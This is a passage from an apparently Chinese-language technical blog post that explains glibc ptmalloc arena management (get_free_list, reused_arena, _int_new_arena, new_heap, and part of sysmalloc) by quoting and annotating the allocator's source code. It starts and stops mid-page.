class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">size_t</span> narenas_limit;</span><br><span class="line"></span><br><span class="line">  a = get_free_list ();</span><br><span class="line">  <span class="keyword">if</span> (a == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Nothing immediately available, so generate a new arena.  */</span></span><br><span class="line">      <span class="keyword">if</span> (narenas_limit == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (mp_.arena_max != <span class="number">0</span>)</span><br><span class="line">            narenas_limit = mp_.arena_max;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (narenas &gt; mp_.arena_test)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">int</span> n = __get_nprocs ();</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (n &gt;= <span class="number">1</span>)</span><br><span class="line">                narenas_limit = NARENAS_FROM_NCORES (n);</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                <span class="comment">/* We have no information about the system.  Assume two</span></span><br><span class="line"><span class="comment">                   cores.  */</span></span><br><span class="line">                narenas_limit = NARENAS_FROM_NCORES (<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    repeat:;</span><br><span class="line">      <span class="keyword">size_t</span> n = narenas;</span><br><span class="line">      <span class="comment">/* NB: the following depends on the fact that (size_t)0 - 1 is a</span></span><br><span class="line"><span class="comment">         very large number and that the underflow is OK.  If arena_max</span></span><br><span class="line"><span class="comment">         is set the value of arena_test is irrelevant.  If arena_test</span></span><br><span class="line"><span class="comment">         is set but narenas is not yet larger or equal to arena_test</span></span><br><span class="line"><span class="comment">         narenas_limit is 0.  There is no possibility for narenas to</span></span><br><span class="line"><span class="comment">         be too big for the test to always fail since there is not</span></span><br><span class="line"><span class="comment">         enough address space to create that many arenas.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (n &lt;= narenas_limit - <span class="number">1</span>))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (catomic_compare_and_exchange_bool_acq (&amp;narenas, n + <span class="number">1</span>, n))</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">          a = _int_new_arena (size);</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (a == <span class="literal">NULL</span>))</span><br><span class="line">            catomic_decrement (&amp;narenas);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        a = reused_arena (avoid_arena);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先跟踪get_free_list函数，free_list也是一个全局变量，用于标识下一个可用的分配区，逻辑十分简单，当获取到的free_list不为空，就替换了当前线程保存的分配区，并对该分配区加锁，否则返回NULL。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> mstate</span><br><span class="line">get_free_list (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate replaced_arena = thread_arena;</span><br><span class="line">  mstate result = free_list;</span><br><span class="line">  <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      (<span class="keyword">void</span>) mutex_lock (&amp;free_list_lock);</span><br><span class="line">      result = free_list;</span><br><span class="line">      <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  free_list = result-&gt;next_free;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* The arena will be attached to this thread.  */</span></span><br><span class="line">	  ++result-&gt;attached_threads;</span><br><span class="line"></span><br><span class="line">	  detach_arena (replaced_arena);</span><br><span class="line">	&#125;</span><br><span class="line">      (<span class="keyword">void</span>) mutex_unlock (&amp;free_list_lock);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          LIBC_PROBE (memory_arena_reuse_free_list, <span class="number">1</span>, result);</span><br><span class="line">          (<span class="keyword">void</span>) mutex_lock (&amp;result-&gt;mutex);</span><br><span class="line">	  thread_arena = result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再跟踪reused_arena，可以看到，程序维护了一个全局变量next_to_use，该变量初始值是&amp;main_arena，当成功获取了一个分配区后，这个变量会指向下一个分配区，也就是说分配区的使用是平均和循环的，这也避免了一个分配区被重复使用多次。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> mstate</span><br><span class="line">reused_arena (mstate avoid_arena)</span><br><span class="line">&#123;</span><br><span class="line">  mstate result;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> Access to next_to_use suffers from data races.  */</span></span><br><span class="line">  <span class="keyword">static</span> mstate next_to_use;</span><br><span class="line">  <span class="keyword">if</span> (next_to_use == <span class="literal">NULL</span>)</span><br><span class="line">    next_to_use = &amp;main_arena;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Iterate over all arenas (including those linked from</span></span><br><span class="line"><span class="comment">     free_list).  */</span></span><br><span class="line">  result = next_to_use;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (!arena_is_corrupt (result) &amp;&amp; !mutex_trylock (&amp;result-&gt;mutex))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* <span class="doctag">FIXME:</span> This is a data race, see _int_new_arena.  */</span></span><br><span class="line">      result = result-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">while</span> (result != next_to_use);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Avoid AVOID_ARENA as we have already failed to allocate memory</span></span><br><span class="line"><span class="comment">     in that arena and it is currently locked.   */</span></span><br><span class="line">  <span class="keyword">if</span> (result == avoid_arena)</span><br><span class="line">    result = result-&gt;next;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure that the arena we get is not corrupted.  */</span></span><br><span class="line">  mstate begin = result;</span><br><span class="line">  <span class="keyword">while</span> (arena_is_corrupt (result) || result == avoid_arena)</span><br><span class="line">    &#123;</span><br><span class="line">      result = result-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (result == begin)</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We could not find any arena that was either not corrupted or not the one</span></span><br><span class="line"><span class="comment">     we wanted to avoid.  */</span></span><br><span class="line">  <span class="keyword">if</span> (result == begin || result == avoid_arena)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* No arena available without contention.  Wait for the next in line.  */</span></span><br><span class="line">  LIBC_PROBE (memory_arena_reuse_wait, <span class="number">3</span>, &amp;result-&gt;mutex, result, avoid_arena);</span><br><span class="line">  (<span class="keyword">void</span>) mutex_lock (&amp;result-&gt;mutex);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">  <span class="comment">/* Attach the arena to the current thread.  Note that we may have</span></span><br><span class="line"><span class="comment">     selected an arena which was on free_list.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Update the arena thread attachment counters.   */</span></span><br><span class="line">    mstate replaced_arena = thread_arena;</span><br><span class="line">    (<span class="keyword">void</span>) mutex_lock (&amp;free_list_lock);</span><br><span class="line">    detach_arena (replaced_arena);</span><br><span class="line">    ++result-&gt;attached_threads;</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;free_list_lock);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  LIBC_PROBE (memory_arena_reuse, <span class="number">2</span>, result, avoid_arena);</span><br><span class="line">  thread_arena = result;</span><br><span class="line">  next_to_use = result-&gt;next;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后，分析一下一个新分配区的生成函数_int_new_arena。首先调用了new_heap函数来申请新的内存，可以看到，当获得内存后，该内存的第一块是heap_info结构，接下来设置了malloc_state结构和top头。</p>
<p>至此，一个新的分配区生成完毕。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> mstate</span><br><span class="line">_int_new_arena (<span class="keyword">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  mstate a;</span><br><span class="line">  heap_info *h;</span><br><span class="line">  <span class="keyword">char</span> *ptr;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> misalign;</span><br><span class="line"></span><br><span class="line">  h = new_heap (size + (<span class="keyword">sizeof</span> (*h) + <span class="keyword">sizeof</span> (*a) + MALLOC_ALIGNMENT),</span><br><span class="line">                mp_.top_pad);</span><br><span class="line">  <span class="keyword">if</span> (!h)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe size is too large to fit in a single heap.  So, just try</span></span><br><span class="line"><span class="comment">         to create a minimally-sized arena and let _int_malloc() attempt</span></span><br><span class="line"><span class="comment">         to deal with the large request via mmap_chunk().  */</span></span><br><span class="line">      h = new_heap (<span class="keyword">sizeof</span> (*h) + <span class="keyword">sizeof</span> (*a) + MALLOC_ALIGNMENT, mp_.top_pad);</span><br><span class="line">      <span class="keyword">if</span> (!h)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  a = h-&gt;ar_ptr = (mstate) (h + <span class="number">1</span>);</span><br><span class="line">  malloc_init_state (a);</span><br><span class="line">  a-&gt;attached_threads = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">/*a-&gt;next = NULL;*/</span></span><br><span class="line">  a-&gt;system_mem = a-&gt;max_system_mem = h-&gt;size;</span><br><span class="line">  arena_mem += h-&gt;size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set up the top chunk, with proper alignment. */</span></span><br><span class="line">  ptr = (<span class="keyword">char</span> *) (a + <span class="number">1</span>);</span><br><span class="line">  misalign = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunk2mem (ptr) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">  <span class="keyword">if</span> (misalign &gt; <span class="number">0</span>)</span><br><span class="line">    ptr += MALLOC_ALIGNMENT - misalign;</span><br><span class="line">  top (a) = (mchunkptr) ptr;</span><br><span class="line">  set_head (top (a), (((<span class="keyword">char</span> *) h + h-&gt;size) - ptr) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">  LIBC_PROBE (memory_arena_new, <span class="number">2</span>, a, size);</span><br><span class="line">  mstate replaced_arena = thread_arena;</span><br><span class="line">  thread_arena = a;</span><br><span class="line">  mutex_init (&amp;a-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  (<span class="keyword">void</span>) mutex_lock (&amp;list_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Add the new arena to the global list.  */</span></span><br><span class="line">  a-&gt;next = main_arena.next;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> The barrier is an attempt to synchronize with read access</span></span><br><span class="line"><span class="comment">     in reused_arena, which does not acquire list_lock while</span></span><br><span class="line"><span class="comment">     traversing the list.  */</span></span><br><span class="line">  atomic_write_barrier ();</span><br><span class="line">  main_arena.next = a;</span><br><span class="line"></span><br><span class="line">  (<span class="keyword">void</span>) mutex_unlock (&amp;list_lock);</span><br><span class="line"></span><br><span class="line">  (<span class="keyword">void</span>) mutex_lock (&amp;free_list_lock);</span><br><span class="line">  detach_arena (replaced_arena);</span><br><span class="line">  (<span class="keyword">void</span>) mutex_unlock (&amp;free_list_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Lock this arena.  NB: Another thread may have been attached to</span></span><br><span class="line"><span class="comment">     this arena because the arena is now accessible from the</span></span><br><span class="line"><span class="comment">     main_arena.next list and could have been picked by reused_arena.</span></span><br><span class="line"><span class="comment">     This can only happen for the last arena created (before the arena</span></span><br><span class="line"><span class="comment">     limit is reached).  At this point, some arena has to be attached</span></span><br><span class="line"><span class="comment">     to two threads.  We could acquire the arena lock before list_lock</span></span><br><span class="line"><span class="comment">     to make it less likely that reused_arena picks this new arena,</span></span><br><span class="line"><span class="comment">     but this could result in a deadlock with ptmalloc_lock_all.  */</span></span><br><span class="line"></span><br><span class="line">  (<span class="keyword">void</span>) mutex_lock (&amp;a-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后再追踪一下new_heap这个申请内存的函数。全局变量 aligned_heap_area 是上一次调用 mmap 分配内存的结束虚拟地址，并已经按照 HEAP_MAX_SIZE 大小对齐。如果 aligned_heap_area 不为空，尝试从上次映射结束地址开始映射大小为 HEAP_MAX_SIZE 的内存块， 由于全局变量 aligned_heap_area 没有锁保护，可能存在多个线程同时 mmap()函数从 aligned_heap_area 开始映射新的虚拟内存块，操作系统会保证只会有一个线程会成功，其它在同一地址映射新虚拟内存块都会失败。 无论映射是否成功，都将全局变量 aligned_heap_area 设置为 NULL。如果映射成功，但返回的虚拟地址不是按HEAP_MAX_SIZE 大小对齐的，取消该区域的映射，映射失败。 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> heap_info *</span><br><span class="line">internal_function</span><br><span class="line">new_heap (<span class="keyword">size_t</span> size, <span class="keyword">size_t</span> top_pad)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> pagesize = GLRO (dl_pagesize);</span><br><span class="line">  <span class="keyword">char</span> *p1, *p2;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ul;</span><br><span class="line">  heap_info *h;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size + top_pad &lt; HEAP_MIN_SIZE)</span><br><span class="line">    size = HEAP_MIN_SIZE;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (size + top_pad &lt;= HEAP_MAX_SIZE)</span><br><span class="line">    size += top_pad;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (size &gt; HEAP_MAX_SIZE)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    size = HEAP_MAX_SIZE;</span><br><span class="line">  size = ALIGN_UP (size, pagesize);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* A memory region aligned to a multiple of HEAP_MAX_SIZE is needed.</span></span><br><span class="line"><span class="comment">     No swap space needs to be reserved for the following large</span></span><br><span class="line"><span class="comment">     mapping (on Linux, this is the case for all non-writable mappings</span></span><br><span class="line"><span class="comment">     anyway). */</span></span><br><span class="line">  p2 = MAP_FAILED;</span><br><span class="line">  <span class="keyword">if</span> (aligned_heap_area)</span><br><span class="line">    &#123;</span><br><span class="line">      p2 = (<span class="keyword">char</span> *) MMAP (aligned_heap_area, HEAP_MAX_SIZE, PROT_NONE,</span><br><span class="line">                          MAP_NORESERVE);</span><br><span class="line">      aligned_heap_area = <span class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">if</span> (p2 != MAP_FAILED &amp;&amp; ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) p2 &amp; (HEAP_MAX_SIZE - <span class="number">1</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">          __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">          p2 = MAP_FAILED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (p2 == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">      p1 = (<span class="keyword">char</span> *) MMAP (<span class="number">0</span>, HEAP_MAX_SIZE &lt;&lt; <span class="number">1</span>, PROT_NONE, MAP_NORESERVE);</span><br><span class="line">      <span class="keyword">if</span> (p1 != MAP_FAILED)</span><br><span class="line">        &#123;</span><br><span class="line">          p2 = (<span class="keyword">char</span> *) (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) p1 + (HEAP_MAX_SIZE - <span class="number">1</span>))</span><br><span class="line">                         &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>));</span><br><span class="line">          ul = p2 - p1;</span><br><span class="line">          <span class="keyword">if</span> (ul)</span><br><span class="line">            __munmap (p1, ul);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            aligned_heap_area = p2 + HEAP_MAX_SIZE;</span><br><span class="line">          __munmap (p2 + HEAP_MAX_SIZE, HEAP_MAX_SIZE - ul);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Try to take the chance that an allocation of only HEAP_MAX_SIZE</span></span><br><span class="line"><span class="comment">             is already aligned. */</span></span><br><span class="line">          p2 = (<span class="keyword">char</span> *) MMAP (<span class="number">0</span>, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE);</span><br><span class="line">          <span class="keyword">if</span> (p2 == MAP_FAILED)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) p2 &amp; (HEAP_MAX_SIZE - <span class="number">1</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (__mprotect (p2, size, PROT_READ | PROT_WRITE) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  h = (heap_info *) p2;</span><br><span class="line">  h-&gt;size = size;</span><br><span class="line">  h-&gt;mprotect_size = size;</span><br><span class="line">  LIBC_PROBE (memory_heap_new, <span class="number">2</span>, h, h-&gt;size);</span><br><span class="line">  <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>分配区的补充</p>
<p>在malloc获取较大内存空间，导致top用尽时，根据需求会扩大top块的容量。而对于非主分配区，扩大top在一定情况下是获得连续内存的，这就显示出了sub_heap的用途。跟踪一下int_malloc函数，在malloc函数的最后，有这样的代码，当申请的内存，top头无法满足时，会对fastbin进行释放操作，当仍无法满足时，会调用sysmalloc进行补充。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">     ...</span><br><span class="line">     <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>追踪sysmalloc代码，代码过长，截取非主分配区部分。当申请的堆小于mmap直接分配阈值，并且分配区是非主分配区时，首先尝试延长原有的heap长度（连续分配）；当长度不满足需求时，会重新分配一块sub_heap，并设置heap_info值，也就是利用mmap随机在内存中申请一块内存，这块内存位于刚刚分配的低地址位置。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td 